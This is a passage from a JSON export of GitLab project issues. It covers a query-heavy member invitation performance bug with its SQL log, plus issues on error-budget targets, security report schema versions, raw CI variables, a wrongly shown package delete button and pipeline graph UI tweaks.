\"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1011 ORDER BY \"namespaces\".\"id\" ASC LIMIT 1000 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       108: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email2@example.com' AND \"members\".\"id\" != 1079 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       109: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       110: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\") VALUES (736, 1011, 'Group', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id:\n       :member_id: 1079\n       :target_type: User\n       :target_details: Deleted User\n       ', 'Sidney Jones2', 'Deleted User', '2022-03-01 16:06:47.331797', 'User') RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       111: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       112: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 739 AND \"members\".\"id\" != 1080 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       113: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       114: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\", \"target_id\") VALUES (736, 1011, 'Group', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id: 739\n       :member_id: 1080\n       :target_type: User\n       :target_details: Sidney Jones5\n       ', 'Sidney Jones2', 'Sidney Jones5', '2022-03-01 16:06:47.345668', 'User', 739) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       115: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       116: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 741 AND \"members\".\"id\" != 1081 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       117: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       118: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\", \"target_id\") VALUES (736, 1011, 'Group', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id: 741\n       :member_id: 1081\n       :target_type: User\n       :target_details: Sidney Jones7\n       ', 'Sidney Jones2', 'Sidney Jones7', '2022-03-01 16:06:47.358770', 'User', 741) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       119: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n```\n\n\u003c/details\u003e\n\n## Resolutions :construction: \n\n### Caching inside the request\n\n- [x] Look for things like expensive queries that could be done once and then cached during the same request cycle.\n- [x] See if dependency injection can be used so that results of queries are injected into each member add that are only run once during the invitation process\n\n### Limiting number of invites per request\n\n- [x] Limit how many invites can be sent to `members` and/or `invitations` API\n   - not desirable as that number would likely be around 5 to keep under our 100 threshold, but perhaps some sort of limit combined with other fixes.\n   - Frontend limit in invite modal of 10\n   - Backend limits at API/service level\n   \n### Reduce queries/reuse their results inside each _add member_ process for each invite\n\n- [x] Reduce the amount of queries that adding a member requires\n   - Look at Service level and Validations\n   - restructure `app/services/concerns/members/bulk_create_users.rb` class methods - perhaps use another class\n   - re-think creator vs bulk creator and the parsing of the invites - perhaps it can be done in one place beforehand and de-duplicate that logic\n   - consider refactoring `Creator` class into separate Update and Create services","state":"closed","created_at":"2022-03-01T16:18:51.343Z","updated_at":"2022-08-15T17:53:33.174Z","closed_at":"2022-08-15T17:21:35.276Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["auto updated","bug::performance","devops::growth","group::acquisition","missed:14.10","priority::4","reliability","section::growth","severity::4","type::bug","workflow::in dev"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354016","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354016","notes":"https://gitlab.com/api/v4/projects/278964/issues/354016/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354016/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354016","relative":"#354016","full":"gitlab-org/gitlab#354016"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3502,"epic":{"id":62876,"iid":3502,"title":"Move the \"invite members\" form into a modal","url":"/groups/gitlab-org/-/epics/3502","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":103903541,"iid":354008,"project_id":278964,"title":"Opt Group::Optimize in to custom target durations","description":"## Background\n\nIn https://gitlab.com/gitlab-com/gl-infra/scalability/-/issues/1315 we introduced the ability to set custom target durations on Web and API requests so that different types of endpoints could be held to different standards as the stage groups see fit. \n\nIn the spirit of iteration, this feature was released before the custom targets were incorporated into the Error Budgets themselves. \n\nIn this issue, we will describe how all stage groups can now opt-in to using these custom target durations. \n\n## How do we opt-in?\n\nThe process is described in detail in this documentation: https://docs.gitlab.com/ee/development/application_slis/rails_request_apdex.html\n\nThe key piece is to edit the [teams.yml file](https://gitlab.com/gitlab-com/runbooks/-/blob/master/services/teams.yml) to remove the `ignored_components` key from your stage group.","state":"closed","created_at":"2022-03-01T15:46:04.675Z","updated_at":"2022-03-17T09:48:59.036Z","closed_at":"2022-03-17T09:48:59.009Z","closed_by":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"labels":["Category:Error Budgets","auto updated","backend","devops::manage","group::optimize","priority::2","section::dev","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354008","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354008","notes":"https://gitlab.com/api/v4/projects/278964/issues/354008/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354008/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354008","relative":"#354008","full":"gitlab-org/gitlab#354008"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103896077,"iid":353997,"project_id":278964,"title":"Use versioned schemas when validating security reports","description":"### Why are we doing this work\n\nCurrently `lib/gitlab/ci/parsers/security/validators/schema_validator.rb` is not validating against the schema version declared by the report, instead it uses the schema present under `lib/gitlab/ci/parsers/security/validators/schemas/` instead which is not what we want.\n\n### Implementation plan\n\n1. Adjust `lib/gitlab/ci/parsers/security/validators/schema_validator.rb` so it accepts a version as an argument\n1. Adjust `lib/gitlab/ci/parsers/security/common.rb` so it passes the parsed version to `SchemaValidator`","state":"closed","created_at":"2022-03-01T14:00:37.712Z","updated_at":"2022-05-12T14:09:08.562Z","closed_at":"2022-03-07T03:59:54.923Z","closed_by":{"id":480804,"username":"thiagocsf","name":"Thiago Figueiró","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"labels":["backend","devops::secure","feature::enhancement","group::threat insights","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4473655,"username":"jschafer","name":"Jonathan Schafer","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c9a0dad78ff350f1f7fffd44514269a?s=80\u0026d=identicon","web_url":"https://gitlab.com/jschafer"}],"author":{"id":487608,"username":"Quintasan","name":"Michał Zając","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/487608/avatar.png","web_url":"https://gitlab.com/Quintasan"},"type":"ISSUE","assignee":{"id":4473655,"username":"jschafer","name":"Jonathan Schafer","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c9a0dad78ff350f1f7fffd44514269a?s=80\u0026d=identicon","web_url":"https://gitlab.com/jschafer"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353997","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353997","notes":"https://gitlab.com/api/v4/projects/278964/issues/353997/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353997/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353997","relative":"#353997","full":"gitlab-org/gitlab#353997"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6968,"epic":{"id":374803,"iid":6968,"title":"Enforce validation of security reports","url":"/groups/gitlab-org/-/epics/6968","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103890047,"iid":353991,"project_id":278964,"title":"Backend: Make it possible to set a raw variable in our syntax","description":"### Release notes\n\nPreviously it was impossible to use the `$` character inside a variable since $ sign represents a variable expansion (a reference to another variable), in this release, we are introducing the variable: expand: keyword which will allow you to mark a variable as raw, a raw variable is will not be expanded and can contain any special character which will get passed to the GitLab runner as is.\n\n\n### Problem\nIt's impossible to use $ in variables, a workaround is to use double $ however it seems that it doesn't work with some bash script\n\n### solution\nSince we do support raw variables let's add a way for our users to define them in our syntax\n\n### Proposal\n\nwe should add\ntype: raw to our syntax\n\n```yaml\nvariables: \n  RAW_VAR:\n    value: $myvar\n    expand: false #default is true\n```\n\n## Implementation Table\n\n\u003c!--\n_NOTE: If the issue is not part of an epic, the implementation table can be removed. If it is part of an epic, make sure that the implementation table below mirrors the corresponding epic's implementation table content._\n--\u003e\n\n\n| Group | Issues | Issue Link | Notes |\n| ------ | ------ | ------ | ------ |\n|~backend |Backend: Make it possible to set variables as non-expanded in CI/CD Settings \u003e Variables|https://gitlab.com/gitlab-org/gitlab/-/issues/361934| MVC |\n| ~backend | Backend:  Backend: Make it possible to set a raw variable in our syntax | :point_left: **You are here** | MVC |\n| ~frontend | Frontend: Make it possible to set variables as non-expanded in CI/CD Settings \u003e Variables | https://gitlab.com/gitlab-org/gitlab/-/issues/217309 | MVC |\n| ~backend | Backend: Allow special characters to be used for raw variable types | https://gitlab.com/gitlab-org/gitlab/-/issues/352657 | MVC |\n| ~backend | Backend: Make it possible to set variables as non-expanded in Project-\u003epipelines/new | https://gitlab.com/gitlab-org/gitlab/-/issues/362539 | TBD at a later date |\n| ~backend | Backend: Make it possible to set variables as non-expanded in Manual Job-\u003ePlay | https://gitlab.com/gitlab-org/gitlab/-/issues/362548 | TBD at a later date |\n| ~backend | Backend: Make it possible to set variables as non-expanded in Project-\u003epipeline_schedules/new | https://gitlab.com/gitlab-org/gitlab/-/issues/362549 | TBD at a later date |","state":"closed","created_at":"2022-03-01T12:22:40.503Z","updated_at":"2022-12-21T15:29:59.589Z","closed_at":"2022-11-16T07:59:57.501Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","UX","auto updated","backend","backend-weight::3","devops::verify","documentation","feature::addition","group::pipeline authoring","release post item::in review","section::ops","type::feature","workflow::production"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":42,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353991","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353991","notes":"https://gitlab.com/api/v4/projects/278964/issues/353991/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353991/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353991","relative":"#353991","full":"gitlab-org/gitlab#353991"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":1994,"epic":{"id":13309,"iid":1994,"title":"Raw (unexpanded) variables MVC","url":"/groups/gitlab-org/-/epics/1994","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":103882970,"iid":353985,"project_id":278964,"title":"The package deletion button is shown to users without the permission to delete a package","description":"**Setting the issue as confidential as I haven't checked that there's no actual vulnerability.**\n\n### Summary\n\nWhile being logged out, I checked [the Package Registry page of this project](https://gitlab.com/gitlab-org/gitlab/-/packages) and realized that the \"delete package\" buttons were shown.\n\nSince I actually wanted to delete the two first packages I tried to click the buttons, but then got a \"Something went wrong\" error (thankfully!).\n\nThe buttons shouldn't be shown when the current user doesn't have the permission to perform the action.\n\n### Steps to reproduce\n\n1. Be logged out of GitLab.com\n1. Visit https://gitlab.com/gitlab-org/gitlab/-/packages\n1. The deletion buttons are shown\n\n### What is the current *bug* behavior?\n\nThe \"delete package\" buttons are shown even if the current user doesn't have the permission to perform the action.\n\n### What is the expected *correct* behavior?\n\nThe \"delete package\" buttons shouldn't be shown when the current user doesn't have the permission to perform the action.\n\n### Relevant logs and/or screenshots\n\n\u003cdetails\u003e\u003csummary\u003eSee the screenshot\u003c/summary\u003e\n![Screen_Shot_2022-03-01_at_11.26.19](/uploads/84a29eff1c702fce441a1ffabc7742c7/Screen_Shot_2022-03-01_at_11.26.19.png)\n\u003c/details\u003e\n\n#### Results of GitLab environment info\n\nThis happens on GitLab.com.","state":"closed","created_at":"2022-03-01T10:32:38.908Z","updated_at":"2022-05-25T01:48:35.255Z","closed_at":"2022-05-17T13:12:48.406Z","closed_by":{"id":11214192,"username":"rchanila","name":"Rahul Chanila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11214192/avatar.png","web_url":"https://gitlab.com/rchanila"},"labels":["Category:Package Registry","SUS::Impacting","Stretch","UX","approaching-SLO","devops::package","frontend","frontend-weight::2","group::package registry","missed-SLO","permissions","priority::2","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":11214192,"username":"rchanila","name":"Rahul Chanila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11214192/avatar.png","web_url":"https://gitlab.com/rchanila"}],"author":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"type":"ISSUE","assignee":{"id":11214192,"username":"rchanila","name":"Rahul Chanila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11214192/avatar.png","web_url":"https://gitlab.com/rchanila"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353985","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353985","notes":"https://gitlab.com/api/v4/projects/278964/issues/353985/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353985/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353985","relative":"#353985","full":"gitlab-org/gitlab#353985"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7041,"epic":{"id":379190,"iid":7041,"title":"Package Registry UI/UX improvements","url":"/groups/gitlab-org/-/epics/7041","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":"on_track"},{"id":103879568,"iid":353980,"project_id":278964,"title":"Frontend: Refine the the mini pipeline graph button states and add a stage name to the dropdown panel","description":"\u003c!-- This issue template can be used as a great starting point for feature requests. The section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab.\n\nThe goal of this template is brevity for quick/smaller iterations. For a more thorough list of considerations for larger features or feature sets, you can leverage the detailed [feature proposal](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md). --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve\n\n- Currently it's not possible to tell which pipeline stage the dropdown relates to in the mini pipeline graph. It makes it difficult to navigate between the stages and jobs in the graph.\n- Some states for the buttons are missing.\n\n|  | \n| ------ | \n| ![image](/uploads/7ddb0e5e6e7deea7556cbe549c4d7b22/image.png) | \n\n\u003c!-- What is the user problem you are trying to solve with this issue? --\u003e\n\n### Proposal\n\n* Add a distinct state to the pipeline icon button in the graph for when the dropdown is open, so you can see which stage is currently \"active\"\n* Add the missing focus state [as described in this comment](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/85850#note_937246232)\n* Add a stage name to the dropdown panel header\n\n##### Other minor tweak: \n* alignment is broken in Firefox and on wrap\n\n**Out of scope:** We will also add a tip to the dropdown panel pointing to the stage that it relates to in a separate gitlab-ui component update.\n\n#### :point_right: [Design specs in Figma](https://www.figma.com/file/17NxNEMa7i28Is8sMetO2H/Data-Visualization?node-id=1006%3A3157)\n\n| Hover state (increased border + fill + dropshadow) | \"Active\" state when the dropdown panel is open + the stage name header (only increased border)\n| ------ | ------ | \n| ![image](/uploads/9e9a95cab8d1935cd28ee56b2635ae6b/image.png) |  ![image](/uploads/89810e98fcdb61ef46fcc3d2d28af078/image.png) |\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n\n--\u003e\n\n### Feature Usage Metrics\n\nN/A\n\n\u003c!-- How are you going to track usage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-03-01T09:42:07.009Z","updated_at":"2022-06-02T08:42:02.429Z","closed_at":"2022-05-31T14:19:54.573Z","closed_by":{"id":11222776,"username":"bsandlin","name":"Briley  